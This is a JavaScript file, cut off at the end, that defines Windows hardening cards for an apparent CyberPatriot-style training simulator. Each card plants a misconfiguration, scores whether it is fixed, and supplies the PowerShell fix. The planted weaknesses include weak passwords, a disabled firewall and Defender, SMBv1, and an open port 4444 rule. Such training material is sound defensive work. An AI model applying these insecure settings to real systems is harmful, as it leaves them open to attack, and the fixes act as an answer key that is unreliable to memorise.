// Windows 11 deck. Each card is one kind of CyberPatriot Windows task, modelled on real round reports
// ("Removed unauthorized user", "A secure lockout threshold exists", "SMB v1 removed or disabled", ...).
// A card's plan(ctx) declares, through ctx (see index.js):
//   ctx.apply(fn)                    the misconfiguration made to the fresh image
//   ctx.vuln({ id, title, pts, check })   a scored check (category comes from the card)
//   ctx.solve(phase, psCommand, ...input)  the elevated PowerShell fix, used by tests/windows.test.mjs
// Phases: 0 forensics, 1 general fixes, 2 removals, 3 account creation, 4 things that need the new accounts.
import * as S from '../../win/state.js';
import { putFile } from '../../win/image.js';
import { exportTemplate } from '../../win/native.js';
import * as BP from '../../core/browserprefs.js';
import { sha256hex } from '../../core/util.js';
import { WEAK, WORDS, GROUPS, PORTS } from '../deck/names.js';

const b64 = (s) => (typeof btoa === 'function' ? btoa(unescape(encodeURIComponent(s))) : Buffer.from(s, 'utf8').toString('base64'));
const q = (s) => `'${String(s).replace(/'/g, "''")}'`;
const lc = (s) => String(s).toLowerCase();
const BIN = (n) => `MZ\u0090\u0000(simulated ${n})`;
const secure = (ctx, pw) => `(ConvertTo-SecureString ${q(pw)} -AsPlainText -Force)`;
const regPS = (k) => `HKLM:\\${S.regKey(k).slice(5)}`;
const program = (sys, id) => S.listPrograms(sys).some((p) => p.id === id);
const userDir = (n) => `/Users/${n}`;
const FFPREFS = 'C:\\Users\\student\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\w7k2m4qa.default-release\\prefs.js';

function addProgram(sys, p) {
  S.listPrograms(sys).push({ installed: '10/02/2026', size: 40, ...p });
  if (p.dir && p.exe) putFile(sys, `${p.dir}/${p.exe}`, BIN(p.exe), { size: 3500000, days: 25 });
  const k = `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\${p.name}`;
  S.regSet(sys, k, 'DisplayName', p.name, 'REG_SZ', { noTouch: true }); S.regSet(sys, k, 'DisplayVersion', p.version, 'REG_SZ', { noTouch: true }); S.regSet(sys, k, 'Publisher', p.publisher || '', 'REG_SZ', { noTouch: true });
  if (p.desktop) putFile(sys, `/Users/Public/Desktop/${p.name}.lnk`, `[shortcut] ${S.toWin(`${p.dir}/${p.exe}`)}`);
}
function addService(sys, s) {
  const svc = { group: '', account: 'Local System', listen: [], desc: '', ...s };
  S.listServices(sys).push(svc);
  if (svc.status === 'Running') S.spawnFor(sys, svc);
}
const setReg = (sys, key, name, v, type = 'REG_DWORD') => S.regSet(sys, key, name, v, type, { noTouch: true });
/** The secedit round trip that real players use to change settings the GUI-less tools cannot reach. */
const seceditFix = (ctx, replacements) => {
  ctx.solve(1, 'secedit /export /cfg C:\\secpol.cfg');
  for (const [from, to] of replacements) ctx.solve(1, `(Get-Content C:\\secpol.cfg) -replace ${q(from)}, ${q(to)} | Set-Content C:\\secpol.cfg`);
  ctx.solve(1, 'secedit /configure /db C:\\Windows\\security\\local.sdb /cfg C:\\secpol.cfg /areas SECURITYPOLICY USER_RIGHTS');
  ctx.solve(1, 'Remove-Item C:\\secpol.cfg');
};
void exportTemplate;

const USER = 'User Auditing';
const ACCT = 'Account Policy';
const LOCAL = 'Local Policy';
const DEF = 'Defensive Countermeasures';
const OSSET = 'Uncategorized Operating System Settings';
const SVC = 'Service Auditing';
const OSUPD = 'Operating System Updates';
const APPUPD = 'Application Updates';
const FILES = 'Prohibited Files';
const SOFT = 'Unwanted Software';
const MAL = 'Malware';
const APPSEC = 'Application Security';

// ======================================================================== Local Policy: security options
const SECOPT_CARDS = [
  { id: 'so-blankpw', opt: 'blankPw', bad: 0, good: 1, title: 'Limit local use of blank passwords to console only [enabled]' },
  { id: 'so-anonsam', opt: 'anonSAM', bad: 0, good: 1, title: 'Do not allow anonymous enumeration of SAM accounts [enabled]' },
  { id: 'so-anonshares', opt: 'anonShares', bad: 0, good: 1, title: 'Do not allow anonymous enumeration of SAM accounts and shares [enabled]' },
  { id: 'so-smbclient', opt: 'netClientSign', bad: 0, good: 1, title: 'Microsoft network client: Digitally sign communications (always) [enabled]' },
  { id: 'so-smbserver', opt: 'netServerSign', bad: 0, good: 1, title: 'Microsoft network server: Digitally sign communications (always) [enabled]' },
  { id: 'so-cad', opt: 'noCAD', bad: 1, good: 0, title: 'Do not require CTRL+ALT+DEL [disabled]' },
  { id: 'so-everyone', opt: 'everyoneAnon', bad: 1, good: 0, title: 'Let Everyone permissions apply to anonymous users [disabled]' },
  { id: 'so-lmhash', opt: 'lmHash', bad: 0, good: 1, title: 'Do not store LAN Manager hash value on next password change [enabled]' },
  { id: 'so-lastuser', opt: 'lastUser', bad: 0, good: 1, title: "Don't display last signed-in [enabled]" },
  { id: 'so-shutdown', opt: 'shutdownNoLogon', bad: 1, good: 0, title: 'Allow system to be shut down without having to log on [disabled]' },
  { id: 'so-uac', opt: 'uacLua', bad: 0, good: 1, title: 'User Account Control: Run all administrators in Admin Approval Mode [enabled]' },
  { id: 'so-uacprompt', opt: 'uacPrompt', bad: 0, good: 2, title: 'UAC does not elevate administrators without prompting', check: (v) => Number(v) !== 0 },
  { id: 'uac-always', opt: 'uacPrompt', bad: 5, good: 2, title: 'User Account Control is set to always notify', check: (v) => Number(v) === 2 },
  { id: 'so-auditforce', opt: 'auditForce', bad: 0, good: 1, title: 'Audit: Force audit policy subcategory settings to override category settings [enabled]' },
].map((c) => ({
  id: c.id, cat: LOCAL, pts: 3, weight: 1, group: c.opt,
  plan(ctx) {
    const o = S.SECOPTS.find((x) => x.id === c.opt);
    ctx.apply((sys) => setReg(sys, o.key, o.value, c.bad));
    ctx.vuln({ id: c.id, title: c.title, check: (s) => { const v = S.regGet(s, o.key, o.value) ?? o.dflt; return c.check ? c.check(v) : Number(v) === c.good; } });
    ctx.solve(1, `Set-ItemProperty -Path ${q(regPS(o.key))} -Name ${o.value} -Value ${c.good}`);
  },
}));

const AUDITS = [['Credential Validation', 'Account Logon', 'success'], ['File Share', 'Object Access', 'success'], ['User Account Management', 'Account Management', 'success'], ['Security Group Management', 'Account Management', 'success'], ['Logon', 'Logon/Logoff', 'failure'], ['Audit Policy Change', 'Policy Change', 'success'], ['Process Creation', 'Detailed Tracking', 'success'], ['Sensitive Privilege Use', 'Privilege Use', 'failure'], ['Security System Extension', 'System', 'success']];

export const CARDS = [
  // ====================================================================== User Auditing
  { id: 'unauth', cat: USER, pts: 4, plan(ctx) {
    for (let i = 0, n = ctx.want?.unauth ?? ctx.int(1, 2); i < n; i++) {
      const u = ctx.person(); const adm = ctx.chance(0.5);
      ctx.apply((sys) => { S.addUser(sys, { name: u.name, full: u.full, password: ctx.pick(WEAK(u.name)), groups: adm ? ['Administrators', 'Users'] : ['Users'], noTouch: true }); ctx.makeProfile(sys, u.name); });
      ctx.unauthorized.push(u.name);
      ctx.vuln({ id: `rm-${u.name}`, title: `Removed unauthorized user ${u.name}`, check: (s) => !S.getUser(s, u.name) });
      ctx.solve(2, `Remove-LocalUser -Name ${u.name}`);
    }
  } },
  { id: 'notadmin', cat: USER, pts: 4, plan(ctx) {
    for (let i = 0, n = ctx.want?.notadmin ?? ctx.int(1, 2); i < n; i++) {
      const name = ctx.takeUser(); if (!name) return;
      ctx.apply((sys) => S.addMember(sys, 'Administrators', name, { quiet: true }));
      ctx.vuln({ id: `notadmin-${name}`, title: `User ${name} is not an administrator`, check: (s) => !!S.getUser(s, name) && !S.isAdmin(s, name) });
      ctx.solve(1, `Remove-LocalGroupMember -Group Administrators -Member ${name}`);
    }
  } },
  { id: 'mkadmin', cat: USER, pts: 3, when: (ctx) => ctx.admins.length > 1, plan(ctx) {
    const a = ctx.admins[1];
    ctx.apply((sys) => S.removeMember(sys, 'Administrators', a.name));
    ctx.vuln({ id: `mkadmin-${a.name}`, title: `User ${a.name} is an administrator`, check: (s) => S.isAdmin(s, a.name) });
    ctx.solve(1, `Add-LocalGroupMember -Group Administrators -Member ${a.name}`);
  } },
  { id: 'weakpw', cat: USER, pts: 3, plan(ctx) {
    for (let i = 0, n = ctx.int(1, 2); i < n; i++) {
      const name = ctx.takeUser(); if (!name) return;
      const weak = ctx.pick(WEAK(name)); const pw = ctx.strongPw();
      ctx.apply((sys) => { S.setPassword(sys, name, weak, { checkPolicy: false }); sys.misc.initialWinHashes[lc(name)] = S.getUser(sys, name).hash; });
      ctx.vuln({ id: `pw-${name}`, title: `Changed insecure password for user ${name}`, check: (s) => S.passwordIsSecure(s, name, [weak]) });
      ctx.solve(2, `Set-LocalUser -Name ${name} -Password ${secure(ctx, pw)}`);
    }
  } },
  { id: 'nopw', cat: USER, pts: 3, plan(ctx) {
    const name = ctx.takeUser(); if (!name) return;
    const pw = ctx.strongPw();
    ctx.apply((sys) => { S.setPassword(sys, name, '', { checkPolicy: false }); sys.misc.initialWinHashes[lc(name)] = ''; });
    ctx.vuln({ id: `haspw-${name}`, title: `User ${name} has a password`, check: (s) => !!S.getUser(s, name)?.hash });
    ctx.solve(2, `Set-LocalUser -Name ${name} -Password ${secure(ctx, pw)}`);
  } },
  { id: 'pwexpire', cat: USER, pts: 2, plan(ctx) {
    const name = ctx.takeUser(); if (!name) return;
    ctx.apply((sys) => S.setUserFlags(sys, name, { neverExpires: true }));
    ctx.vuln({ id: `expire-${name}`, title: `Password for ${name} expires`, check: (s) => !!S.getUser(s, name) && !S.getUser(s, name).neverExpires });
    ctx.solve(1, `Set-LocalUser -Name ${name} -PasswordNeverExpires $false`);
  } },
  { id: 'newhire', cat: USER, pts: 3, plan(ctx) {
    const u = ctx.person(); const pw = ctx.strongPw();
    ctx.newHires.push(u.name);
    ctx.readme.notes.push(`A new employee, <b>${u.full}</b>, starts this week. Create a standard (non-administrator) local account named <code>${u.name}</code> for them. A secure temporary password of your choice is fine.`);
    ctx.vuln({ id: `new-${u.name}`, title: `Created user account ${u.name}`, check: (s) => { const x = S.getUser(s, u.name); return !!x && x.enabled && !S.isAdmin(s, u.name) && S.userGroups(s, u.name).some((g) => g.name === 'Users'); } });
    ctx.solve(3, `New-LocalUser -Name ${u.name} -FullName ${q(u.full)} -Password ${secure(ctx, pw)}`);
    ctx.solve(3, `Add-LocalGroupMember -Group Users -Member ${u.name}`);
  } },
  { id: 'guest', cat: USER, pts: 3, plan(ctx) {
    ctx.apply((sys) => S.setUserFlags(sys, 'Guest', { enabled: true }));
    ctx.vuln({ id: 'guest', title: 'Guest account is not enabled', check: (s) => !s.win.users.find((u) => u.rid === 501)?.enabled });
    ctx.solve(1, 'Disable-LocalUser -Name Guest');
  } },
  { id: 'builtinadmin', cat: USER, pts: 3, plan(ctx) {
    ctx.apply((sys) => { S.setUserFlags(sys, 'Administrator', { enabled: true }); S.setPassword(sys, 'Administrator', 'Admin123', { checkPolicy: false }); });
    ctx.vuln({ id: 'builtinadmin', title: 'Built-in Administrator account is disabled', check: (s) => !s.win.users.find((u) => u.rid === 500)?.enabled });
    ctx.solve(1, 'Disable-LocalUser -Name Administrator');
  } },
  { id: 'backupop', cat: USER, pts: 3, plan(ctx) {
    const name = ctx.takeUser(); if (!name) return;
    ctx.apply((sys) => S.addMember(sys, 'Backup Operators', name, { quiet: true }));
    ctx.vuln({ id: `backupop-${name}`, title: `User ${name} is no longer a Backup Operator`, check: (s) => !!S.getUser(s, name) && !S.getGroup(s, 'Backup Operators').members.some((m) => lc(m) === lc(name)) });
    ctx.solve(1, `Remove-LocalGroupMember -Group 'Backup Operators' -Member ${name}`);
  } },
  { id: 'rdpgroup', cat: USER, pts: 3, plan(ctx) {
    const name = ctx.takeUser(); if (!name) return;
    ctx.apply((sys) => S.addMember(sys, 'Remote Desktop Users', name, { quiet: true }));
    ctx.vuln({ id: `rdpgrp-${name}`, title: 'Updated Remote Desktop Users group', check: (s) => !!S.getUser(s, name) && !S.getGroup(s, 'Remote Desktop Users').members.some((m) => lc(m) === lc(name)) }); // deleting the authorized user is a penalty, not a fix
    ctx.solve(1, `Remove-LocalGroupMember -Group 'Remote Desktop Users' -Member ${name}`);
  } },
  { id: 'group', cat: USER, pts: 3, plan(ctx) {
    const g = ctx.pick(['Exec SMB Users', 'Finance Share', 'Design Team', 'Payroll Readers', 'Help Desk', `${ctx.pick(GROUPS)[0].toUpperCase()}${ctx.pick(GROUPS).slice(1)} Staff`]);
    const members = ctx.shuffle(ctx.users.map((u) => u.name)).slice(0, 2);
    ctx.readme.notes.push(`Create a local group named <code>${g}</code> and add <code>${members.join('</code> and <code>')}</code> to it.`);
    ctx.vuln({ id: 'grp-create', title: `Created group ${g}`, check: (s) => !!S.getGroup(s, g) });
    ctx.vuln({ id: 'grp-members', title: 'Added users to group', pts: 2, check: (s) => { const x = S.getGroup(s, g); return !!x && members.every((m) => x.members.some((y) => lc(y) === lc(m))); } });
    ctx.solve(3, `New-LocalGroup -Name ${q(g)}`);
    ctx.solve(4, `Add-LocalGroupMember -Group ${q(g)} -Member ${members.join(',')}`);
  } },

  // ====================================================================== Account Policy
  { id: 'minlen', cat: ACCT, pts: 3, plan(ctx) {
    ctx.apply((sys) => { sys.win.policy.minLen = ctx.pick([0, 4, 6]); });
    ctx.vuln({ id: 'minlen', title: 'A secure minimum password length is required', check: (s) => s.win.policy.minLen >= 10 });
    ctx.solve(1, 'net accounts /minpwlen:12');
  } },
  { id: 'history', cat: ACCT, pts: 3, plan(ctx) {
    ctx.apply((sys) => { sys.win.policy.history = ctx.pick([0, 1]); });
    ctx.vuln({ id: 'history', title: 'A sufficient password history is being kept', check: (s) => s.win.policy.history >= 5 });
    ctx.solve(1, 'net accounts /uniquepw:5');
  } },
  { id: 'maxage', cat: ACCT, pts: 2, plan(ctx) {
    ctx.apply((sys) => { sys.win.policy.maxAge = 0; });
    ctx.vuln({ id: 'maxage', title: 'A secure maximum password age exists', check: (s) => s.win.policy.maxAge > 0 && s.win.policy.maxAge <= 90 });
    ctx.solve(1, 'net accounts /maxpwage:90');
  } },
  { id: 'minage', cat: ACCT, pts: 2, plan(ctx) {
    ctx.apply((sys) => { sys.win.policy.minAge = 0; });
    ctx.vuln({ id: 'minage', title: 'A secure minimum password age exists', check: (s) => s.win.policy.minAge >= 1 });
    ctx.solve(1, 'net accounts /minpwage:1');
  } },
  { id: 'lockout', cat: ACCT, pts: 3, plan(ctx) {
    ctx.apply((sys) => { sys.win.policy.lockoutThreshold = 0; });
    ctx.vuln({ id: 'lockout', title: 'A secure lockout threshold exists', check: (s) => s.win.policy.lockoutThreshold >= 5 && s.win.policy.lockoutThreshold <= 10 }); // 1-4 is the deprecated-threshold penalty, so it must not also score
    ctx.solve(1, 'net accounts /lockoutthreshold:5');
  } },
  { id: 'lockdur', cat: ACCT, pts: 2, plan(ctx) {
    ctx.apply((sys) => { sys.win.policy.lockoutDuration = ctx.pick([1, 5]); });
    ctx.vuln({ id: 'lockdur', title: 'A secure account lockout duration exists', check: (s) => s.win.policy.lockoutDuration >= 30 });
    ctx.solve(1, 'net accounts /lockoutduration:30');
  } },
  { id: 'complexity', cat: ACCT, pts: 3, plan(ctx) {
    ctx.apply((sys) => { sys.win.policy.complexity = false; });
    ctx.vuln({ id: 'complexity', title: 'Passwords must meet complexity requirements', check: (s) => s.win.policy.complexity === true });
    seceditFix(ctx, [['PasswordComplexity = 0', 'PasswordComplexity = 1']]);
  } },
  { id: 'reversible', cat: ACCT, pts: 3, plan(ctx) {
    ctx.apply((sys) => { sys.win.policy.reversible = true; });
    ctx.vuln({ id: 'reversible', title: 'Passwords are not stored using reversible encryption', check: (s) => s.win.policy.reversible === false });
    seceditFix(ctx, [['ClearTextPassword = 1', 'ClearTextPassword = 0']]);
  } },

  // ====================================================================== Local Policy
  ...SECOPT_CARDS,
  { id: 'audit', cat: LOCAL, pts: 3, plan(ctx) {
    const picks = [];
    for (const a of ctx.shuffle(AUDITS)) { if (picks.length >= ctx.int(1, 2)) break; if (!picks.some((p) => p[1] === a[1])) picks.push(a); }
    for (const [sub, cat, kind] of picks) {
      ctx.vuln({ id: `audit-${lc(sub).replace(/\W+/g, '-')}`, title: `Audit ${sub} [${kind === 'success' ? 'Success' : 'Failure'}]`, check: (s) => !!s.win.audit[cat]?.[kind] });
      ctx.solve(1, `auditpol /set /subcategory:"${sub}" /${kind}:enable`);
    }
  } },
  { id: 'right-tcb', cat: LOCAL, pts: 3, plan(ctx) {
    ctx.apply((sys) => { sys.win.rights.SeTcbPrivilege = ['Everyone']; });
    ctx.vuln({ id: 'right-tcb', title: 'Act as part of the operating system is restricted', check: (s) => !(s.win.rights.SeTcbPrivilege || []).length });
    seceditFix(ctx, [['^SeTcbPrivilege = .*$', 'SeTcbPrivilege = ']]);
  } },
  { id: 'right-debug', cat: LOCAL, pts: 3, plan(ctx) {
    ctx.apply((sys) => { sys.win.rights.SeDebugPrivilege = ['Administrators', 'Users']; });
    ctx.vuln({ id: 'right-debug', title: 'Debug programs is restricted to administrators', check: (s) => (s.win.rights.SeDebugPrivilege || []).every((m) => m === 'Administrators') });
    seceditFix(ctx, [['^SeDebugPrivilege = .*$', 'SeDebugPrivilege = *S-1-5-32-544']]);
  } },

  // ====================================================================== Defensive Countermeasures
  { id: 'firewall', cat: DEF, pts: 4, plan(ctx) {
    const off = ctx.pick([['Domain', 'Private', 'Public'], ['Public'], ['Private', 'Public']]);
    ctx.apply((sys) => { for (const p of off) sys.win.firewall[p].enabled = false; });
    ctx.vuln({ id: 'firewall', title: 'Firewall protection has been enabled', check: (s) => S.firewallAllOn(s) });
    ctx.solve(1, 'Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled True');
  } },
  { id: 'fwrule', cat: DEF, pts: 2, plan(ctx) {
    const port = ctx.pick([23, 21, 5900, 4444]);
    const name = ctx.pick(['Remote Helper', 'Legacy Telnet', 'VNC Server', 'Admin Tools']);
    ctx.apply((sys) => sys.win.fwRules.push({ id: `{${(port * 7919).toString(16)}-rule}`, name, enabled: true, dir: 'Inbound', action: 'Allow', port }));
    ctx.vuln({ id: 'fwrule', title: `Removed firewall rule allowing inbound port ${port}`, check: (s) => !s.win.fwRules.some((r) => r.name === name && r.enabled) });
    ctx.solve(1, `Remove-NetFirewallRule -DisplayName ${q(name)}`);
  } },
  { id: 'defender', cat: DEF, pts: 4, plan(ctx) {
    const viaPolicy = ctx.chance(0.5);
    ctx.apply((sys) => { Object.assign(sys.win.defender, { realtime: false, tamper: false }); if (viaPolicy) setReg(sys, S.KEYS.defenderRtp, 'DisableRealtimeMonitoring', 1); });
    ctx.vuln({ id: 'defender', title: 'Microsoft Defender real-time protection is enabled', check: (s) => S.realtimeOn(s) });
    if (viaPolicy) ctx.solve(1, `Remove-ItemProperty -Path ${q(regPS(S.KEYS.defenderRtp))} -Name DisableRealtimeMonitoring`);
    ctx.solve(1, 'Set-MpPreference -DisableRealtimeMonitoring $false');
  } },
  { id: 'smartscreen', cat: DEF, pts: 2, plan(ctx) {
    const k = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer';
    ctx.apply((sys) => setReg(sys, k, 'SmartScreenEnabled', 'Off', 'REG_SZ'));
    ctx.vuln({ id: 'smartscreen', title: 'SmartScreen checks apps and files', check: (s) => ['warn', 'requireadmin', 'prompt'].includes(lc(S.regGet(s, k, 'SmartScreenEnabled') ?? '')) });
    ctx.solve(1, `Set-ItemProperty -Path ${q(regPS(k))} -Name SmartScreenEnabled -Value Warn`);
  } },

  // ====================================================================== Uncategorized OS settings
  { id: 'rdpoff', cat: OSSET, pts: 4, when: (ctx) => !ctx.rdpRequired, plan(ctx) {
    ctx.apply((sys) => { setReg(sys, S.KEYS.ts, 'fDenyTSConnections', 0); const t = S.getService(sys, 'TermService'); t.startType = 'Manual'; t.status = 'Running'; S.spawnFor(sys, t); });
    ctx.vuln({ id: 'rdpoff', title: 'Remote desktop sharing is turned off', check: (s) => !S.rdpEnabled(s) });
    if (ctx.want?.rdpGpo ?? ctx.chance(0.5)) ctx.solve(1, `reg add "${S.KEYS.tsPolicy}" /v fDenyTSConnections /t REG_DWORD /d 1 /f`); // gpedit: Allow users to connect remotely... = Disabled
    else ctx.solve(1, `Set-ItemProperty -Path ${q(regPS(S.KEYS.ts))} -Name fDenyTSConnections -Value 1`);
  } },
  { id: 'nla', cat: OSSET, pts: 3, when: (ctx) => ctx.rdpRequired, plan(ctx) {
    ctx.apply((sys) => setReg(sys, S.KEYS.rdpTcp, 'UserAuthentication', 0));
    ctx.vuln({ id: 'nla', title: 'RDP network level authentication enabled', check: (s) => S.nlaRequired(s) });
    ctx.solve(1, `Set-ItemProperty -Path ${q(regPS(S.KEYS.rdpTcp))} -Name UserAuthentication -Value 1`);
  } },
  { id: 'smb1', cat: OSSET, pts: 4, plan(ctx) {
    ctx.apply((sys) => { sys.win.features.SMB1Protocol.state = 'Enabled'; setReg(sys, S.KEYS.lanman, 'SMB1', 1); });
    ctx.vuln({ id: 'smb1', title: 'SMB v1 removed or disabled', check: (s) => !S.smb1On(s) });
    ctx.solve(1, 'Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart');
  } },
  { id: 'psv2', cat: OSSET, pts: 2, plan(ctx) {
    ctx.vuln({ id: 'psv2', title: 'Windows PowerShell 2.0 is disabled', check: (s) => S.featureState(s, 'MicrosoftWindowsPowerShellV2Root')?.state !== 'Enabled' });
    ctx.solve(1, 'Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -NoRestart');
  } },
  { id: 'hiddenshare', cat: OSSET, pts: 3, plan(ctx) {
    const name = ctx.pick(['Backup$', 'Files$', 'Data$', 'Transfer$']);
    const path = ctx.pick(['C:\\Users', 'C:\\Users\\Public\\Documents', 'C:\\']);
    ctx.hiddenShare = { name, path };
    ctx.apply((sys) => sys.win.shares.push({ name, path, desc: '' }));
    ctx.vuln({ id: 'hiddenshare', title: 'File sharing disabled for hidden share', check: (s) => !s.win.shares.some((x) => x.name === name) });
    ctx.solve(2, `Remove-SmbShare -Name ${q(name)} -Force`);
  } },
  { id: 'autologon', cat: OSSET, pts: 3, plan(ctx) {
    ctx.apply((sys) => { setReg(sys, S.KEYS.winlogon, 'AutoAdminLogon', '1', 'REG_SZ'); setReg(sys, S.KEYS.winlogon, 'DefaultUserName', 'student', 'REG_SZ'); setReg(sys, S.KEYS.winlogon, 'DefaultPassword', ctx.studentPw, 'REG_SZ'); });
    ctx.vuln({ id: 'autologon', title: 'Automatic logon is disabled', check: (s) => S.regGet(s, S.KEYS.winlogon, 'AutoAdminLogon') !== '1' && S.regGet(s, S.KEYS.winlogon, 'DefaultPassword') == null });
    ctx.solve(1, `Set-ItemProperty -Path ${q(regPS(S.KEYS.winlogon))} -Name AutoAdminLogon -Value 0`);
    ctx.solve(1, `Remove-ItemProperty -Path ${q(regPS(S.KEYS.winlogon))} -Name DefaultPassword`);
  } },
  { id: 'gpo-winrm', cat: OSSET, pts: 3, plan(ctx) {
    ctx.apply((sys) => { setReg(sys, S.KEYS.winrmService, 'AllowUnencryptedTraffic', 1); const w = S.getService(sys, 'WinRM'); w.startType = 'Automatic'; w.status = 'Running'; S.spawnFor(sys, w); });
    ctx.vuln({ id: 'gpo-winrm', title: 'Windows Remote Management service does not send or receive unencrypted traffic', check: (s) => !S.winrmUnencryptedAllowed(s) });
    ctx.solve(1, `reg add "${S.KEYS.winrmService}" /v AllowUnencryptedTraffic /t REG_DWORD /d 0 /f`);
  } },
  { id: 'gpo-installer', cat: OSSET, pts: 3, plan(ctx) {
    ctx.apply((sys) => setReg(sys, S.KEYS.installer, 'AlwaysInstallElevated', 1));
    ctx.vuln({ id: 'gpo-installer', title: 'Windows Installer does not always install with elevated privileges', check: (s) => Number(S.regGet(s, S.KEYS.installer, 'AlwaysInstallElevated') ?? 0) === 0 });
    ctx.solve(1, `reg add "${S.KEYS.installer}" /v AlwaysInstallElevated /t REG_DWORD /d 0 /f`);
  } },
  { id: 'autoplay', cat: OSSET, pts: 2, plan(ctx) {
    ctx.vuln({ id: 'autoplay', title: 'AutoPlay is disabled for all drives', check: (s) => Number(S.regGet(s, S.KEYS.explorerPol, 'NoDriveTypeAutoRun') ?? 0) === 255 });
    ctx.solve(1, `reg add "${S.KEYS.explorerPol}" /v NoDriveTypeAutoRun /t REG_DWORD /d 255 /f`);
  } },

  // ====================================================================== Service Auditing
  { id: 'service', cat: SVC, pts: 4, plan(ctx) {
    const pick = ctx.pick([
      { name: 'ftpsvc', display: 'Microsoft FTP Service', short: 'FTP', listen: [{ proto: 'tcp', addr: '0.0.0.0', port: 21 }], desc: 'Enables this server to be a File Transfer Protocol (FTP) server.' },
      { name: 'W3SVC', display: 'World Wide Web Publishing Service', short: 'web (IIS)', listen: [{ proto: 'tcp', addr: '0.0.0.0', port: 80 }], desc: 'Provides Web connectivity and administration through the Internet Information Services Manager.' },
      { name: 'TlntSvr', display: 'Telnet', short: 'Telnet', listen: [{ proto: 'tcp', addr: '0.0.0.0', port: 23 }], desc: 'Enables a remote user to log on to this computer and run programs.' },
      { name: 'SNMP', display: 'SNMP Service', short: 'SNMP', listen: [{ proto: 'udp', addr: '0.0.0.0', port: 161 }], desc: 'Enables Simple Network Management Protocol (SNMP) requests to be processed by this computer.' },
      { name: 'RemoteRegistry', display: 'Remote Registry', short: 'remote registry', existing: true },
    ]);
    ctx.readme.notServices.push(pick.short);
    ctx.apply((sys) => {
      if (pick.existing) { const s = S.getService(sys, pick.name); s.startType = 'Automatic'; s.status = 'Running'; S.spawnFor(sys, s); }
      else addService(sys, { name: pick.name, display: pick.display, desc: pick.desc, startType: 'Automatic', status: 'Running', exe: 'svchost.exe', group: 'netsvcs', listen: pick.listen });
    });
    ctx.vuln({ id: `svc-${lc(pick.name)}`, title: `${pick.short === 'FTP' ? 'FTP' : pick.display} service has been stopped and disabled`, check: (s) => S.serviceOff(s, pick.name) });
    ctx.solve(1, `Stop-Service -Name ${pick.name} -Force`);
    ctx.solve(1, `Set-Service -Name ${pick.name} -StartupType Disabled`);
  } },
  { id: 'wscsvc', cat: SVC, pts: 3, plan(ctx) {
    ctx.apply((sys) => { const s = S.getService(sys, 'wscsvc'); s.startType = 'Disabled'; s.status = 'Stopped'; for (const p of sys.processes.filter((x) => x.svc === 'win:wscsvc')) sys.killProc(p.pid); });
    ctx.vuln({ id: 'wscsvc', title: 'Windows Security Center service is running', check: (s) => S.serviceOn(s, 'wscsvc') });
    ctx.solve(1, 'Set-Service -Name wscsvc -StartupType Automatic');
    ctx.solve(1, 'Start-Service -Name wscsvc');
  } },
  { id: 'upnp', cat: SVC, pts: 2, plan(ctx) {
    ctx.apply((sys) => { const s = S.getService(sys, 'upnphost'); s.startType = 'Automatic'; s.status = 'Running'; S.spawnFor(sys, s); });
    ctx.vuln({ id: 'svc-upnp', title: 'UPnP Device Host service has been stopped and disabled', check: (s) => S.serviceOff(s, 'upnphost') });
    ctx.solve(1, 'Stop-Service -Name upnphost -Force');
    ctx.solve(1, 'Set-Service -Name upnphost -StartupType Disabled');
  } },

  // ====================================================================== Operating System Updates
  { id: 'updates', cat: OSUPD, pts: 4, plan(ctx) {
    ctx.vuln({ id: 'updates', title: 'The majority of Windows updates are installed', check: (s) => S.updatesApplied(s) });
    ctx.solve(1, 'Install-WindowsUpdate -AcceptAll -IgnoreReboot');
  } },
  { id: 'autoupd', cat: OSUPD, pts: 3, plan(ctx) {
    ctx.apply((sys) => { setReg(sys, S.KEYS.wuAU, 'NoAutoUpdate', 1); });
    ctx.vuln({ id: 'autoupd', title: 'Windows automatic updates are enabled', check: (s) => S.autoUpdatesOn(s) });
    ctx.solve(1, `Set-ItemProperty -Path ${q(regPS(S.KEYS.wuAU))} -Name NoAutoUpdate -Value 0`);
  } },
  { id: 'wuauserv', cat: OSUPD, pts: 3, plan(ctx) {
    ctx.apply((sys) => { const s = S.getService(sys, 'wuauserv'); s.startType = 'Disabled'; s.status = 'Stopped'; for (const p of sys.processes.filter((x) => x.svc === 'win:wuauserv')) sys.killProc(p.pid); });
    ctx.vuln({ id: 'wuauserv', title: 'Windows Update service is enabled', check: (s) => S.getService(s, 'wuauserv').startType !== 'Disabled' });
    ctx.solve(1, 'Set-Service -Name wuauserv -StartupType Manual');
    ctx.solve(1, 'Start-Service -Name wuauserv');
  } },

  // ====================================================================== Application Updates
  { id: 'nppupd', cat: APPUPD, pts: 3, plan(ctx) {
    ctx.vuln({ id: 'nppupd', title: 'Notepad++ has been updated', check: (s) => S.programUpdated(s, 'Notepad++.Notepad++') });
    ctx.solve(1, 'winget upgrade --id Notepad++.Notepad++ --silent');
  } },
  { id: 'ffupd', cat: APPUPD, pts: 3, plan(ctx) {
    ctx.vuln({ id: 'ffupd', title: 'Firefox has been updated', check: (s) => S.programUpdated(s, 'Mozilla.Firefox') });
    ctx.solve(1, 'winget upgrade --id Mozilla.Firefox --silent');
  } },
  { id: 'tbupd', cat: APPUPD, pts: 3, when: (ctx) => !ctx.server, plan(ctx) {
    ctx.vuln({ id: 'tbupd', title: 'Thunderbird has been updated', check: (s) => S.programUpdated(s, 'Mozilla.Thunderbird') });
    ctx.solve(1, 'winget upgrade --id Mozilla.Thunderbird --silent');
  } },
  { id: '7zupd', cat: APPUPD, pts: 2, plan(ctx) {
    ctx.apply((sys) => { const p = S.listPrograms(sys).find((x) => x.id === '7zip.7zip'); p.version = '19.00'; p.name = '7-Zip 19.00 (x64)'; });
    ctx.vuln({ id: '7zupd', title: '7-Zip has been updated', check: (s) => S.programUpdated(s, '7zip.7zip') });
    ctx.solve(1, 'winget upgrade --id 7zip.7zip --silent');
  } },

  // ====================================================================== Unwanted Software
  { id: 'software', cat: SOFT, pts: 4, plan(ctx) {
    const all = [
